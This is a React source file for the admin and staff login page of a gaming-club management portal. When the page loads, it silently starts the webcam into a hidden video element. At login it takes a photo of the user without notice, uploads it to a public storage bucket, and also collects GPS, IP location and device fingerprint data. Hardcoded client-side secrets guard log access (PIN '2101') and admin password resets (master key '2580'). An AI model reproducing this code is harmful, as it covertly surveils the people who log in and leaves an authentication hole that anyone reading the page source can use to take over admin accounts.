import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/context/AuthContext';
import { ZapIcon, Target, Award, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { UAParser } from 'ua-parser-js';
import { supabase } from "@/integrations/supabase/client";
import { BRAND_NAME } from "@/config/brand";

interface LocationState {
  from?: string;
}

const BrandMark = ({ subtitle }: { subtitle: string }) => {
  return (
    <div className="relative inline-flex items-center gap-3">
      <div className="relative">
        <div className="absolute -inset-1 rounded-2xl bg-gradient-to-r from-gamehaus-purple/25 to-gamehaus-magenta/25 blur-md opacity-70 animate-neon-pulse" />
        <div className="relative h-12 w-12 rounded-2xl border border-gamehaus-purple/30 bg-black/60 backdrop-blur-sm flex items-center justify-center">
          <div className="absolute inset-0 rounded-2xl bg-grid-pattern opacity-[0.07]" />
          <ZapIcon className="relative h-5 w-5 text-gamehaus-lightpurple drop-shadow-[0_0_14px_rgba(255,74,26,0.35)]" />
        </div>
      </div>
      <div className="min-w-0">
        <p className="text-xs tracking-[0.25em] text-gray-400 truncate">{BRAND_NAME.toUpperCase()}</p>
        <p className="text-sm text-gray-300 truncate">{subtitle}</p>
      </div>
    </div>
  );
};

const Login = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginType, setLoginType] = useState('admin');
  const { login, resetPassword } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();
  const location = useLocation();
  const locationState = location.state as LocationState;
  const [animationClass, setAnimationClass] = useState('');
  
  const [forgotDialogOpen, setForgotDialogOpen] = useState(false);
  const [forgotUsername, setForgotUsername] = useState('');
  const [masterKey, setMasterKey] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [forgotPasswordStep, setForgotPasswordStep] = useState(1);
  const [forgotPasswordType, setForgotPasswordType] = useState('admin');
  const [resetLoading, setResetLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [showMasterKey, setShowMasterKey] = useState(false);
  
  const [pinDialogOpen, setPinDialogOpen] = useState(false);
  const [pinInput, setPinInput] = useState('');
  const [showPin, setShowPin] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraReady, setCameraReady] = useState(false);
  
  const [loginMetadata, setLoginMetadata] = useState<any>({});

  useEffect(() => {
    const timer = setTimeout(() => {
      setAnimationClass('animate-scale-in');
    }, 100);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    let activeStream: MediaStream | null = null;

    const initCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'user', width: 640, height: 480 },
          audio: false 
        });

        activeStream = stream;
        
        const videoEl = videoRef.current;
        if (videoEl) {
          videoEl.srcObject = stream;
          videoEl.play();
          setCameraReady(true);
          console.log('📷 Camera initialized silently');
        }
      } catch (error) {
        console.log('⚠️ Camera not available or permission denied');
        setCameraReady(false);
      }
    };
    
    initCamera();

    return () => {
      if (activeStream) activeStream.getTracks().forEach(track => track.stop());
    };
  }, []);

  const captureSilentPhoto = (): string | null => {
    if (!cameraReady || !videoRef.current || !canvasRef.current) {
      console.log('⚠️ Camera not ready for capture');
      return null;
    }

    try {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      if (ctx) {
        ctx.drawImage(video, 0, 0);
        console.log('📸 Selfie captured silently');
        return canvas.toDataURL('image/jpeg', 0.8);
      }
    } catch (error) {
      console.error('❌ Error capturing photo:', error);
    }
    
    return null;
  };

  const uploadSelfie = async (imageData: string): Promise<string | null> => {
    try {
      const base64Data = imageData.split(',')[1];
      const fileName = `selfie_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`;
      
      const { data, error } = await supabase.storage
        .from('login-selfies')
        .upload(fileName, decode(base64Data), {
          contentType: 'image/jpeg',
          cacheControl: '3600',
        });

      if (error) throw error;

      const { data: publicUrlData } = supabase.storage
        .from('login-selfies')
        .getPublicUrl(fileName);

      console.log('✅ Selfie uploaded successfully');
      return publicUrlData.publicUrl;
    } catch (error) {
      console.error('❌ Error uploading selfie:', error);
      return null;
    }
  };

  const decode = (base64: string): Uint8Array => {
    const binaryString = window.atob(base64);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
      bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
  };

  useEffect(() => {
    const collectLoginInfo = async () => {
      try {
        const parser = new UAParser();
        const device = parser.getResult();
        
        let metadata: any = {
          browser: device.browser.name,
          browserVersion: device.browser.version,
          os: device.os.name,
          osVersion: device.os.version,
          deviceType: device.device.type || 'desktop',
          deviceModel: device.device.model || 'Unknown',
          deviceVendor: device.device.vendor || 'Unknown',
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          colorDepth: window.screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          touchSupport: 'ontouchstart' in window
        };

        if ('hardwareConcurrency' in navigator) {
          metadata.cpuCores = (navigator as any).hardwareConcurrency;
        }
        if ('deviceMemory' in navigator) {
          metadata.deviceMemory = (navigator as any).deviceMemory;
        }

        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
        if (connection) {
          metadata.connectionType = connection.effectiveType || connection.type;
        }

        if ('getBattery' in navigator) {
          try {
            const battery: any = await (navigator as any).getBattery();
            metadata.batteryLevel = Math.round(battery.level * 100);
          } catch (e) {
            console.log('⚠️ Battery API not available');
          }
        }

        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          
          const response = await fetch('https://ipapi.co/json/', {
            signal: controller.signal
          });
          clearTimeout(timeoutId);
          
          if (response.ok) {
            const data = await response.json();
            metadata.ip = data.ip;
            metadata.city = data.city;
            metadata.region = data.region;
            metadata.country = data.country_name;
            metadata.timezone = data.timezone;
            metadata.isp = data.org;
            console.log('✅ IP and location data fetched successfully');
          }
        } catch (error) {
          console.log('⚠️ Could not fetch IP data, trying alternative...');
          
          try {
            const response = await fetch('https://api.ipify.org?format=json');
            if (response.ok) {
              const data = await response.json();
              metadata.ip = data.ip;
              console.log('✅ IP fetched from alternative API');
            }
          } catch (e) {
            console.log('⚠️ All IP APIs failed');
          }
        }

        setLoginMetadata(metadata);

        if ('geolocation' in navigator) {
          console.log('📍 Requesting GPS location...');
          navigator.geolocation.getCurrentPosition(
            (position) => {
              console.log('✅ GPS location obtained:', position.coords.latitude, position.coords.longitude);
              const updatedMetadata = {
                ...metadata,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                locationAccuracy: position.coords.accuracy
              };
              setLoginMetadata(updatedMetadata);
            },
            (error) => {
              console.log('⚠️ GPS location denied or unavailable:', error.message);
            },
            { 
              enableHighAccuracy: true, 
              timeout: 10000,
              maximumAge: 0 
            }
          );
        } else {
          console.log('⚠️ Geolocation not supported');
        }

        console.log('🔍 Login tracking ready - metadata collection initiated');
      } catch (error) {
        console.error('❌ Error collecting metadata:', error);
        setLoginMetadata({
          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
          userAgent: navigator.userAgent
        });
      }
    };
    
    collectLoginInfo();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      toast({
        title: 'Error',
        description: 'Please enter both username and password',
        variant: 'destructive',
      });
      return;
    }
    
    setIsLoading(true);
    
    await new Promise(resolve => setTimeout(resolve, 500));
    
    try {
      const isAdminLogin = loginType === 'admin';
      
      let selfieUrl = null;
      const capturedImage = captureSilentPhoto();
      if (capturedImage) {
        selfieUrl = await uploadSelfie(capturedImage);
      }

      const enhancedMetadata = {
        ...loginMetadata,
        selfieUrl
      };

      console.log('🚀 Submitting login with metadata:', {
        hasIP: !!enhancedMetadata.ip,
        hasGPS: !!enhancedMetadata.latitude,
        hasSelfie: !!selfieUrl,
        city: enhancedMetadata.city,
        country: enhancedMetadata.country
      });
      
      const success = await login(username, password, isAdminLogin, enhancedMetadata);
      
      if (success) {
        try {
          sessionStorage.setItem("gh_show_login_splash_v1", "1");
        } catch {
          // ignore
        }
        if (videoRef.current && videoRef.current.srcObject) {
          const stream = videoRef.current.srcObject as MediaStream;
          stream.getTracks().forEach(track => track.stop());
        }

        toast({
          title: 'Success',
          description: `${isAdminLogin ? 'Admin' : 'Staff'} logged in successfully!`,
        });
        
        const redirectTo = locationState?.from || '/dashboard';
        navigate(redirectTo);
      } else {
        toast({
          title: 'Error',
          description: `Invalid ${isAdminLogin ? 'admin' : 'staff'} credentials`,
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handleViewLogsClick = () => {
    setPinInput('');
    setPinDialogOpen(true);
  };

  const handlePinSubmit = () => {
    if (pinInput === '2101') {
      setPinDialogOpen(false);
      navigate('/login-logs');
    } else {
      toast({
        title: 'Error',
        description: 'Incorrect PIN',
        variant: 'destructive',
      });
    }
  };

  const handleForgotPasswordClick = (type: string) => {
    setForgotPasswordType(type);
    setForgotPasswordStep(1);
    setForgotUsername('');
    setMasterKey('');
    setNewPassword('');
    setConfirmPassword('');
    setForgotDialogOpen(true);
  };

  const handleNextStep = () => {
    if (forgotPasswordType === 'staff') {
      toast({
        title: 'Staff Password Reset',
        description: 'Please contact your administrator to reset your password.',
      });
      setForgotDialogOpen(false);
      return;
    }

    if (forgotPasswordStep === 1) {
      if (!forgotUsername) {
        toast({
          title: 'Error',
          description: 'Please enter your username',
          variant: 'destructive',
        });
        return;
      }
      setForgotPasswordStep(2);
    } else if (forgotPasswordStep === 2) {
      if (masterKey === '2580') {
        setForgotPasswordStep(3);
      } else {
        toast({
          title: 'Error',
          description: 'Incorrect master key',
          variant: 'destructive',
        });
      }
    } else if (forgotPasswordStep === 3) {
      handleResetPassword();
    }
  };

  const handleResetPassword = async () => {
    if (!newPassword || !confirmPassword) {
      toast({
        title: 'Error',
        description: 'Please enter and confirm your new password',
        variant: 'destructive',
      });
      return;
    }

    if (newPassword !== confirmPassword) {
      toast({
        title: 'Error',
        description: 'Passwords do not match',
        variant: 'destructive',
      });
      return;
    }

    setResetLoading(true);
    try {
      const success = await resetPassword(forgotUsername, newPassword);
      
      if (success) {
        toast({
          title: 'Success',
          description: 'Password has been reset successfully',
        });
        setForgotDialogOpen(false);
      } else {
        toast({
          title: 'Error',
          description: 'Failed to reset password. Username may not exist.',
          variant: 'destructive',
        });
      }
    } catch (error) {
      toast({
        title: 'Error',
        description: 'Something went wrong. Please try again.',
        variant: 'destructive',
      });
    } finally {
      setResetLoading(false);
    }
  };

  const togglePasswordVisibility = () => setShowPassword(!showPassword);
  const toggleNewPasswordVisibility = () => setShowNewPassword(!showNewPassword);
  const toggleConfirmPasswordVisibility = () => setShowConfirmPassword(!showConfirmPassword);
  const toggleMasterKeyVisibility = () => setShowMasterKey(!showMasterKey);
  const togglePinVisibility = () => setShowPin(!showPin);

  const renderForgotPasswordContent = () => {
    if (forgotPasswordType === 'staff') {
      return (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <KeyRound size={16} className="text-gamehaus-purple" />
              Staff Password Reset
            </DialogTitle>
            <DialogDescription>
              Staff members need to contact an administrator to reset their password.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6 text-center">
            <Users className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
            <p className="text-muted-foreground">
              Please contact your administrator for password assistance.
            </p>
          </div>
          <DialogFooter>
            <Button 
              onClick={() => setForgotDialogOpen(false)}
              className="w-full bg-gradient-to-r from-gamehaus-purple to-gamehaus-magenta hover:from-gamehaus-purple hover:to-gamehaus-magenta"
            >
              Close
            </Button>
          </DialogFooter>
        </>
      );
    }

    if (forgotPasswordStep === 1) {
      return (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <KeyRound size={16} className="text-gamehaus-purple" />
              Admin Password Reset
            </DialogTitle>
            <DialogDescription>
              Enter your admin username to begin the password reset process.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="forgotUsername" className="text-sm font-medium">Username</label>
                <Input
                  id="forgotUsername"
                  type="text"
                  placeholder="Enter your username"
                  value={forgotUsername}
                  onChange={(e) => setForgotUsername(e.target.value)}
                  className="bg-background/50 border-gamehaus-purple/30"
                />
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
            <Button 
              onClick={handleNextStep} 
              disabled={!forgotUsername}
              className="bg-gradient-to-r from-gamehaus-purple to-gamehaus-magenta hover:from-gamehaus-purple hover:to-gamehaus-magenta"
            >
              Next
            </Button>
          </DialogFooter>
        </>
      );
    }

    if (forgotPasswordStep === 2) {
      return (
        <>
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Shield size={16} className="text-gamehaus-purple" />
              Master Key Verification
            </DialogTitle>
            <DialogDescription>
              Enter the master key to verify your identity.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="masterKey" className="text-sm font-medium">Master Key</label>
                <div className="relative">
                  <Input
                    id="masterKey"
                    type={showMasterKey ? "text" : "password"}
                    placeholder="Enter master key"
                    value={masterKey}
                    onChange={(e) => setMasterKey(e.target.value)}
                    className="bg-background/50 border-gamehaus-purple/30 pr-10"
                  />
                  <button
                    type="button"
                    onClick={toggleMasterKeyVisibility}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gamehaus-purple hover:text-gamehaus-magenta focus:outline-none"
                    aria-label={showMasterKey ? "Hide master key" : "Show master key"}
                  >
                    {showMasterKey ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
            <Button 
              onClick={handleNextStep} 
              disabled={!masterKey}
              className="bg-gradient-to-r from-gamehaus-purple to-gamehaus-magenta hover:from-gamehaus-purple hover:to-gamehaus-magenta"
            >
              Verify
            </Button>
          </DialogFooter>
        </>
      );
    }

    return (
      <>
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Lock size={16} className="text-gamehaus-purple" />
            Set New Password
          </DialogTitle>
          <DialogDescription>
            Create a new password for your account.
          </DialogDescription>
        </DialogHeader>
        <div className="py-6">
          <div className="space-y-4">
            <div className="space-y-2">
              <label htmlFor="newPassword" className="text-sm font-medium">New Password</label>
              <div className="relative">
                <Input
                  id="newPassword"
                  type={showNewPassword ? "text" : "password"}
                  placeholder="Enter new password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  className="bg-background/50 border-gamehaus-purple/30 pr-10"
                />
                <button
                  type="button"
                  onClick={toggleNewPasswordVisibility}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gamehaus-purple hover:text-gamehaus-magenta focus:outline-none"
                  aria-label={showNewPassword ? "Hide new password" : "Show new password"}
                >
                  {showNewPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
            <div className="space-y-2">
              <label htmlFor="confirmPassword" className="text-sm font-medium">Confirm Password</label>
              <div className="relative">
                <Input
                  id="confirmPassword"
                  type={showConfirmPassword ? "text" : "password"}
                  placeholder="Confirm new password"
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  className="bg-background/50 border-gamehaus-purple/30 pr-10"
                />
                <button
                  type="button"
                  onClick={toggleConfirmPasswordVisibility}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gamehaus-purple hover:text-gamehaus-magenta focus:outline-none"
                  aria-label={showConfirmPassword ? "Hide confirm password" : "Show confirm password"}
                >
                  {showConfirmPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
            </div>
          </div>
        </div>
        <DialogFooter>
          <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
          <Button 
            onClick={handleResetPassword} 
            disabled={!newPassword || !confirmPassword || resetLoading}
            className="bg-gradient-to-r from-gamehaus-purple to-gamehaus-magenta hover:from-gamehaus-purple hover:to-gamehaus-magenta"
          >
            {resetLoading ? "Resetting..." : "Reset Password"}
          </Button>
        </DialogFooter>
      </>
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#1a1a1a] via-[#1a0f1a] to-[#1a1a1a] overflow-hidden relative">
      <video 
        ref={videoRef} 
        style={{ display: 'none' }}
        autoPlay
        playsInline
        muted
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      <div className="absolute inset-0 z-0 overflow-hidden">
        <div className="absolute inset-0 bg-grid-pattern opacity-[0.06] pointer-events-none" />
        <div className="absolute inset-0 bg-noise-soft opacity-[0.10] mix-blend-overlay pointer-events-none" />
        <div className="absolute inset-0 bg-scanlines opacity-[0.04] mix-blend-overlay pointer-events-none" />

        <div className="absolute -top-36 -left-24 h-[560px] w-[560px] rounded-full bg-gradient-to-br from-gamehaus-purple/20 to-transparent blur-[110px] animate-float opacity-60" />
        <div
          className="absolute -bottom-40 -right-28 h-[560px] w-[560px] rounded-full bg-gradient-to-tr from-gamehaus-magenta/18 to-transparent blur-[110px] animate-float opacity-60"
          style={{ animationDelay: '2.5s' }}
        />

        <div className="absolute inset-x-0 top-[32%] h-px bg-gradient-to-r from-transparent via-gamehaus-purple/20 to-transparent" />
        <div className="absolute inset-x-0 top-[72%] h-px bg-gradient-to-r from-transparent via-gamehaus-magenta/18 to-transparent" />
      </div>

      <div className="relative z-10 w-full max-w-6xl mx-auto px-4 py-10">
        <div className="flex items-center justify-between mb-8">
          <Button 
            variant="ghost" 
            size="sm"
            className="flex items-center gap-2 text-gray-300 hover:text-gamehaus-lightpurple hover:bg-gamehaus-purple/20"
            onClick={() => navigate('/')}
          >
            <ArrowLeft size={16} />
            <span>Back to Home</span>
          </Button>

          <Button 
            variant="ghost" 
            size="sm"
            className="flex items-center gap-2 text-gray-300 hover:text-gamehaus-magenta hover:bg-gamehaus-magenta/20"
            onClick={handleViewLogsClick}
          >
            <FileText size={16} />
            <span>View Logs</span>
          </Button>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
          {/* Left: premium panel (desktop) */}
          <div className="hidden lg:block">
            <div className="relative overflow-hidden rounded-3xl border border-gamehaus-purple/25 bg-black/30 backdrop-blur-xl p-8">
              <div className="absolute inset-0 bg-grid-pattern opacity-[0.06]" />
              <div className="absolute inset-0 bg-noise-soft opacity-[0.10] mix-blend-overlay" />
              <div className="pointer-events-none absolute inset-0 overflow-hidden">
                <div className="absolute inset-x-0 -top-[45%] h-[45%] bg-gradient-to-b from-transparent via-white/10 to-transparent blur-md opacity-40 animate-scanner" />
              </div>

              <div className="relative">
                <div className="flex items-center gap-4">
                  <BrandMark subtitle="Admin & Staff Sign‑in" />
                </div>

                <h1 className="mt-8 text-4xl font-bold text-white leading-tight tracking-tight">
                  Control the floor.
                  <span className="block bg-clip-text text-transparent bg-gradient-to-r from-gamehaus-lightpurple via-gamehaus-magenta to-gamehaus-purple animate-text-gradient">
                    Keep sessions smooth.
                  </span>
                </h1>

                <p className="mt-4 text-gray-300 leading-relaxed">
                  This portal is built for day‑to‑day operations—stations, bookings, billing, staff workflow, and customer flow.
                  Access is role‑based and designed to stay fast during peak hours.
                </p>

                <div className="mt-6 rounded-2xl border border-gamehaus-purple/20 bg-black/35 p-5">
                  <p className="text-xs tracking-[0.25em] text-gray-400">CORE MODULES</p>
                  <div className="mt-3 flex flex-wrap gap-2">
                    <span className="inline-flex items-center rounded-full border border-gamehaus-purple/25 bg-black/40 px-3 py-1 text-xs text-gray-200 hover:border-gamehaus-purple/45 transition-colors">
                      Stations
                    </span>
                    <span className="inline-flex items-center rounded-full border border-gamehaus-purple/25 bg-black/40 px-3 py-1 text-xs text-gray-200 hover:border-gamehaus-purple/45 transition-colors">
                      Bookings
                    </span>
                    <span className="inline-flex items-center rounded-full border border-gamehaus-purple/25 bg-black/40 px-3 py-1 text-xs text-gray-200 hover:border-gamehaus-purple/45 transition-colors">
                      Billing
                    </span>
                    <span className="inline-flex items-center rounded-full border border-gamehaus-purple/25 bg-black/40 px-3 py-1 text-xs text-gray-200 hover:border-gamehaus-purple/45 transition-colors">
                      Staff
                    </span>
                    <span className="inline-flex items-center rounded-full border border-gamehaus-purple/25 bg-black/40 px-3 py-1 text-xs text-gray-200 hover:border-gamehaus-purple/45 transition-colors">
                      Reports
                    </span>
                  </div>
                  <p className="mt-3 text-sm text-gray-300 leading-relaxed">
                    Tip: use <span className="font-semibold text-white">Staff</span> mode for floor operations, and <span className="font-semibold text-white">Admin</span> mode for management actions.
                  </p>
                </div>

                <div className="mt-8 grid grid-cols-1 gap-4">
                  <div className="flex items-start gap-3">
                    <div className="h-10 w-10 rounded-xl bg-gamehaus-purple/20 border border-gamehaus-purple/25 flex items-center justify-center">
                      <Shield className="h-5 w-5 text-gamehaus-lightpurple" />
                    </div>
                    <div>
                      <p className="font-semibold text-white">Role-based access</p>
                      <p className="text-sm text-gray-300">Admin and staff sign-in modes with protected screens.</p>
                    </div>
                  </div>

                  <div className="flex items-start gap-3">
                    <div className="h-10 w-10 rounded-xl bg-gamehaus-magenta/15 border border-gamehaus-purple/25 flex items-center justify-center">
                      <Target className="h-5 w-5 text-gamehaus-lightpurple" />
                    </div>
                    <div>
                      <p className="font-semibold text-white">Operational accuracy</p>
                      <p className="text-sm text-gray-300">Designed for clean session tracking and predictable handovers.</p>
                    </div>
                  </div>

                  <div className="flex items-start gap-3">
                    <div className="h-10 w-10 rounded-xl bg-gamehaus-purple/20 border border-gamehaus-purple/25 flex items-center justify-center">
                      <Award className="h-5 w-5 text-gamehaus-lightpurple" />
                    </div>
                    <div>
                      <p className="font-semibold text-white">Audit-friendly</p>
                      <p className="text-sm text-gray-300">Login activity and access checks help keep the system accountable.</p>
                    </div>
                  </div>
                </div>

                <div className="mt-8 rounded-2xl border border-gamehaus-purple/20 bg-black/35 p-5">
                  <div className="flex items-start gap-3">
                    <Lock className="h-5 w-5 text-gamehaus-lightpurple mt-0.5" />
                    <p className="text-sm text-gray-300 leading-relaxed">
                      <span className="font-semibold text-white">Security notice:</span> Use only on trusted devices. If you suspect unauthorized access, change credentials immediately and review login logs.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Right: login form */}
          <div className={`w-full lg:max-w-lg lg:ml-auto ${animationClass}`}>
            <div className="mb-6 text-center lg:text-left">
              <div className="flex items-center justify-center lg:justify-start gap-3">
                <BrandMark subtitle="Secure sign‑in • administrator & staff" />
              </div>
            </div>

            <Card className="bg-black/80 border border-gamehaus-purple/30 shadow-xl shadow-gamehaus-purple/40 backdrop-blur-lg animate-fade-in delay-100 rounded-2xl overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-br from-gamehaus-purple/6 to-gamehaus-magenta/6 opacity-60 rounded-2xl"></div>
              <div className="absolute w-full h-full bg-grid-pattern opacity-[0.06]"></div>
              
              <CardHeader className="text-center relative z-10 p-5 sm:p-6">
                <CardTitle className="text-xl sm:text-2xl bg-clip-text text-transparent bg-gradient-to-r from-gamehaus-lightpurple to-gamehaus-magenta font-bold">
                  Sign in to manage the club
                </CardTitle>
                <CardDescription className="text-muted-foreground font-medium text-xs sm:text-sm">
                  Use your assigned credentials. Access is logged for security.
                </CardDescription>
              </CardHeader>
              
              <form onSubmit={handleSubmit}>
                <CardContent className="space-y-4 relative z-10 p-5 sm:p-6 pt-0 sm:pt-0">
              <div className="flex justify-center mb-4">
                <Tabs defaultValue="admin" value={loginType} onValueChange={setLoginType} className="w-full max-w-xs">
                  <TabsList className="grid w-full grid-cols-2 bg-gamehaus-purple/30">
                    <TabsTrigger value="admin" className="flex items-center gap-2 data-[state=active]:bg-gamehaus-purple">
                      <Shield size={14} />
                      Admin
                    </TabsTrigger>
                    <TabsTrigger value="staff" className="flex items-center gap-2 data-[state=active]:bg-gamehaus-magenta">
                      <Users size={14} />
                      Staff
                    </TabsTrigger>
                  </TabsList>
                </Tabs>
              </div>

              <div className="space-y-2 group">
                <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-gamehaus-lightpurple group-hover:text-gamehaus-magenta transition-colors duration-300">
                  <User size={14} className="inline-block" />
                  Username
                  <div className="h-px flex-grow bg-gradient-to-r from-gamehaus-purple/50 to-transparent group-hover:from-gamehaus-magenta/50 transition-colors duration-300"></div>
                </label>
                <Input
                  id="username"
                  type="text"
                  placeholder="Enter your username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="bg-background/50 border-gamehaus-purple/30 focus-visible:ring-gamehaus-purple transition-all duration-300 hover:border-gamehaus-purple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-gamehaus-purple/30 text-sm"
                />
              </div>
              
              <div className="space-y-2 group">
                <label htmlFor="password" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-gamehaus-lightpurple group-hover:text-gamehaus-magenta transition-colors duration-300">
                  <ZapIcon size={14} className="inline-block" />
                  Password
                  <div className="h-px flex-grow bg-gradient-to-r from-gamehaus-purple/50 to-transparent group-hover:from-gamehaus-magenta/50 transition-colors duration-300"></div>
                </label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="bg-background/50 border-gamehaus-purple/30 focus-visible:ring-gamehaus-purple transition-all duration-300 hover:border-gamehaus-purple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-gamehaus-purple/30 text-sm pr-10"
                  />
                  <button
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gamehaus-purple hover:text-gamehaus-magenta focus:outline-none transition-colors duration-200"
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              <div className="text-right">
                <Button 
                  type="button" 
                  variant="link" 
                  className="text-gamehaus-lightpurple hover:text-gamehaus-magenta p-0 h-auto text-xs"
                  onClick={() => handleForgotPasswordClick(loginType)}
                >
                  Forgot password?
                </Button>
              </div>
            </CardContent>
            
            <CardFooter className="relative z-10 p-5 sm:p-6 pt-0 sm:pt-0">
              <Button 
                type="submit" 
                className="w-full relative overflow-hidden bg-gradient-to-r from-gamehaus-purple to-gamehaus-magenta hover:from-gamehaus-purple hover:to-gamehaus-magenta hover:shadow-lg hover:shadow-gamehaus-purple/40 hover:scale-[1.02] transition-all duration-300 btn-hover-effect font-medium text-sm sm:text-base" 
                disabled={isLoading}
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  {isLoading ? (
                    <>
                      <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Authenticating...
                    </>
                  ) : (
                    <>
                      {loginType === 'admin' ? <Shield size={16} /> : <Users size={16} />}
                      {loginType === 'admin' ? 'Admin Login' : 'Staff Login'}
                    </>
                  )}
                </span>
              </Button>
            </CardFooter>
          </form>
            </Card>

            <p className="mt-4 text-xs text-gray-400 text-center lg:text-left">
              Need access? Contact your administrator. For customer bookings, use the public booking page from the home screen.
            </p>
          </div>
        </div>
      </div>

      <Dialog open={pinDialogOpen} onOpenChange={setPinDialogOpen}>
        <DialogContent className="sm:max-w-md bg-background border-gamehaus-purple/40">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Lock size={16} className="text-gamehaus-purple" />
              Enter PIN to Access Logs
            </DialogTitle>
            <DialogDescription>
              Enter the security PIN to view login logs.
            </DialogDescription>
          </DialogHeader>
          <div className="py-6">
            <div className="space-y-2">
              <label htmlFor="pinInput" className="text-sm font-medium">Security PIN</label>
              <div className="relative">
                <Input
                  id="pinInput"
                  type={showPin ? "text" : "password"}
                  placeholder="Enter 4-digit PIN"
                  value={pinInput}
                  onChange={(e) => setPinInput(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') {
                      handlePinSubmit();
                    }
                  }}
                  maxLength={4}
                  className="bg-background/50 border-gamehaus-purple/30 pr-10 text-center text-2xl tracking-widest"
                />
                <button
                  type="button"
                  onClick={togglePinVisibility}
